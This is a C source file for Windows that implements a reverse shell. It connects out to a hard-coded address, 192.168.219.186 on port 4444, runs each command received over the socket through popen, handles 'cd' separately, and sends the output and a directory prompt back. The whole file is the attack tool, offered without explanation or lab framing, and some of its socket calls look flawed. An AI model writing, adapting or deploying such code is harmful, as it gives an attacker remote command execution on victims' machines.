#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <direct.h>
#include <winsock2.h>

#define LINE_BUF 10240
#define BIG_BUF 40960


void run_command(char* command, char* buf);
void move_directory(char* path);

int main() {
    WSADATA wsaData;
    SOCKET hSocket;
    SOCKADDR_IN servAddr;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return -1;
    }

    hSocket = socket(PF_INET, SOCK_STREAM, 0);
    if (hSocket == INVALID_SOCKET) {
        return -1;
    }

    memset(&servAddr, 0, sizeof(servAddr));
    servAddr.sin_family = AF_INET;
    servAddr.sin_addr.s_addr = inet_addr("192.168.219.186");
    servAddr.sin_port = htons(4444);

    if (connect(hSocket, (SOCKADDR*)&servAddr, sizeof(servAddr)) == SOCKET_ERROR) {
        return -1;
    }

    char now_path[LINE_BUF] = {0,};
    char command[LINE_BUF] = {0,};
    char result[BIG_BUF] = {0,};

    getcwd(now_path, sizeof(now_path));
    strcat(result, now_path);
    strcat(result, ">");

    write(hSocket, result, sizeof(result));
    memset(now_path, 0, sizeof(now_path));
    memset(command, 0, sizeof(command));
    memset(result, 0, sizeof(result));

    while (1) {
        if ((read(hSocket, command, sizeof(command)-1)) == -1) {
            return -1;
        }
        if (strstr(command, "cd ")) {
            move_directory(command);
        } else {
            run_command(command, result);
        }

        getcwd(now_path, sizeof(now_path));
        strcat(result, now_path);
        strcat(result, ">");


        write(hSocket, result, sizeof(result));

        memset(now_path, 0, sizeof(now_path));
        memset(command, 0, sizeof(command));
        memset(result, 0, sizeof(result));
        
    }

    closesocket(hSocket);
    WSACleanup();

    return 1;
}

void run_command(char* command, char* buf) {
	FILE *fp = NULL;
	char line[LINE_BUF];
	
	if ((fp = popen(command, "r")) == NULL){
		return;
	}
		
	while (fgets(line, LINE_BUF, fp) != NULL) {
		strcat(buf, line);
	}
			
	pclose(fp);	
}

void move_directory(char* path) {
    chdir(path+3);
}